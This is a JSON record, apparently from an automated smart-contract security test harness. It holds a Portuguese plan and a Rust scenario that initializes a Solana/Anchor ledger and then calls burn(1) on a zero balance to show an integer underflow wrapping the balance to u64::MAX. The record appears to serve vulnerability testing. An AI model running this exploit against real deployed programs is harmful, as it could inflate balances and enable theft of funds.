{
  "plan": "O cenário inicializa uma conta Ledger com total_supply=100 e user_balance=0 via a instrução initialize (baseline). Em seguida, tenta-se queimar 1 unidade com user_balance=0, o que deveria causar underflow e falhar. O efeito medido é que, se o ataque for bem-sucedido, o user_balance sofre wrap-around para um valor enorme (u64::MAX) em vez de a instrução falhar, demonstrando a vulnerabilidade de underflow.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger vazia para init
let ledger_account = empty_account();
let authority_account = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

// Baseline: inicializa o ledger com total_supply=100, user_balance=0
let init_ix = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let init_accounts = vec![
    (ledger_key, ledger_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];
let init_result = env.baseline("initialize ledger", &init_ix, &init_accounts);

// Extrai a conta ledger resultante do baseline
let ledger_after_init = init_result
    .resulting_accounts
    .iter()
    .find(|(k, _)| *k == ledger_key)
    .map(|(_, a)| a.clone())
    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data("Ledger", &(authority, 100u64, 0u64)), None));

// Ataque: burn(1) com user_balance=0 -> underflow
let burn_ix = env.anchor_ix(
    "burn",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let burn_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("burn underflow", &burn_ix, &burn_accounts);

// Efeito: se o ataque teve sucesso, user_balance sofreu wrap-around para u64::MAX
if attack_result.program_result == ProgramResult::Success {
    let ledger_data = after(&attack_result, &ledger_key).data();
    let user_balance = read_u64(ledger_data, 40); // offset: 8 (disc) + 32 (authority) = 40
    env.effect("user_balance sofreu underflow (wrap-around para u64::MAX)", user_balance == u64::MAX);
}"
}

